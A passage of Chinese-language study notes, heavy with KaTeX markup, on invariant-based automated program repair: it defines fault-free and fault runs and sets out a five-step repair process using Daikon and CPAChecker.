aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 表示导致目标错误的不良模式集合</li></ul></li></ul></li><li>基于invariant的APR提供了两个关键优点<ul><li><ol><li>将APR导向潜在可行的补丁</li></ol></li><li><ol start="2"><li>使得可以使用程序验证器对合理的补丁惊醒正式验证</li></ol></li></ul></li></ul><h4 id="viability-of-invariant-based-apr-%E5%8F%AF%E8%A1%8C%E6%80%A7%E5%88%86%E6%9E%90" tabindex="-1">Viability of Invariant-based APR 可行性分析</h4><ul><li>程序invariant在多个应用中展现了效率，如程序理解，错误定位和形式验证。</li><li>invariant之所以高效，是因为功能正确性与程序的最终结构相关，而不是特定的实现。 因此，他们可以帮助抽象出许多具体的执行步骤，从而极大的减少了理解补丁正确性所需的工作量。<ul><li>事实上，那些尝试修复一个没有形式规范的错误没有文档的程序（即未经过深思编写的程序）的开发人员可以发现，基于不变量的APR对他们的修复工作很有帮助。</li></ul></li><li>成熟的自动不变量检测工具如Daikon[4]和实用的软件验证工具如CPAChecker和PathFinder的可用性使基于不变量的程序修复技术成为可能。</li><li>乍一看，使用软件验证工具来优化不变量似乎成本太高，然而由于软件验证的巨大进步[2]，实际上，基于invariant的验证变得非常高效。<ul><li>特别是，软件分析框架CPAChecker，支持多种可达性分析，已经被有效地用于验证多达50k行的C程序的各种可达性查询。这使得可达性分析成为一种有前途的技术，可以用来显著减少补丁的过拟合问题并产生高质量补丁</li></ul></li></ul><h3 id="2-%E5%9F%BA%E4%BA%8Einvariant%E7%9A%84apr%E6%A1%86%E6%9E%B6" tabindex="-1">2 基于invariant的APR框架</h3><ul><li>本节将使用程序invariant的概念重新阐释APR问题。</li><li>然后，我们描述了如何分析无故障运行的执行跟踪，推断出程序预期行为的可能规范，以及分析有故障运行的执行跟踪，推断出可能导致故障行为的可疑不变量。再进一步进行前，然我们介绍一些定义</li></ul><h4 id="definition-1-%EF%BC%88fault-free-vs-fault-runs%EF%BC%89" tabindex="-1">Definition 1 （fault-free vs fault runs）</h4><ul><li>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 为一个bug程序，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></eq> 是 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 的运行集合，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>b</mi><mi>e</mi><mi>h</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{beh}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 是程序P的预期行为属性。 我们定义一个运行 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mo>∈</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">r\in R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></eq> 是一个成功的运行（i.e. <strong>fault-free run</strong>）当 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>r</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>φ</mi><mrow><mi>b</mi><mi>e</mi><mi>h</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P(r)=\varphi_{beh}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> ,否则，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mo>∈</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">r \in R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span></eq> 是一个失败的运行（i.e. <strong>fault run</strong>）,当 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>r</mi><mo stretchy="false">)</mo><mo mathvariant="normal">≠</mo><msub><mi>φ</mi><mrow><mi>b</mi><mi>e</mi><mi>h</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P(r)\neq \varphi_{beh}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ul><p>根据定义1我们可以注意到，通过分析从无故障运行中提取的信息，可以推断出程序预期行为的行为规范。 类似的，通过分析故障运行中的执行信息，可以推断出导致错误的错误invariant。 这是因为无故障运行表示保持程序invariant的运行，而有故障的运行表示违反某些程序invariant的运行。</p><h4 id="definition-2-%EF%BC%88invariant-based-apr-problem%EF%BC%89" tabindex="-1">Definition 2 （Invariant-based APR problem）</h4><ul><li><p>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 为一个包含bug <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span></eq> 的程序 并且 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>T</mi><mi>P</mi></msub><mo>∪</mo><msub><mi>T</mi><mi>F</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T=(T_P \cup T_F)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq> 为一个测试套件，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>P</mi></msub></mrow><annotation encoding="application/x-tex">T_P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>表示通过的测试而 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>F</mi></msub></mrow><annotation encoding="application/x-tex">T_F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>表示失败的测试。 令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></eq> 表示动态invariant推断工具如Daikon，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></eq> 表示程序验证工具如CPAChcker，基于invariant的APR过程包含以下步骤：</p><ul><li><ol><li><strong>Invariant 提取</strong>：使用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></eq> 生成程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 的初始invariant集合 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">I</mi></mrow><annotation encoding="application/x-tex">\mathcal{I}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span></span></span></span></eq></li></ol></li><li><ol start="2"><li><strong>Invariant 精炼</strong>:使用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></eq> 精炼集合 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">I</mi></mrow><annotation encoding="application/x-tex">\mathcal{I}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathcal" style="margin-right:0.07382em;">I</span></span></span></span></eq> 产生规范 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{correct}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>。 这可以通过在程序感兴趣的位置断言不变量，并使用任何生成的反例来对其进行精炼来完成。</li></ol></li><li><ol start="3"><li><strong>错误定位</strong>：通过分析 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{correct}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,计算可能产生有效补丁的可疑语句列表</li></ol></li><li><ol start="4"><li><strong>补丁生成</strong>：构造代码，纠正错误的不变量，同时保持程序其它的不变量，通过使用类似搜索或基于语义的补丁生成过程来执行</li></ol></li><li><ol start="5"><li><strong>补丁验证</strong>：使用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></eq> 验证生成的补丁的正确性</li></ol></li></ul></li><li><p>根据正在修复的bug类型和分析程序的结构，不同的程序位置可能与属性 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{correct}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 和 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\varphi_{violated}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 相关联。 示例包括不同函数的前置条件和后置条件，或者某些程序的循环不变量。 需要注意，根据定义2描述的基于不变量的APR过程的前两个步骤对于增加生成的补丁精度是必要的，该过程的实际修复步骤，即3-5步，可以正式陈述如下：</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>t</mi><mo>=</mo><mi>F</mi><mi>V</mi><mo stretchy="false">(</mo><mi>P</mi><mi>G</mi><mi>V</mi><mo stretchy="false">(</mo><mi>F</mi><mi>L</mi><mo stretchy="false">(</mo><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub><mo separator="true">,</mo><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>T</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>φ</mi><mrow><mi>c</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi></mrow></msub><mo separator="true">,</mo><msub><mi>φ</mi><mrow><mi>v</mi><mi>i</mi><mi>o</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">pt = FV(PGV(FL(\varphi_{correct},\varphi_{violated}),T),\varphi_{correct},\varphi_{violated})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">pt</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">PG</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">correc</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span 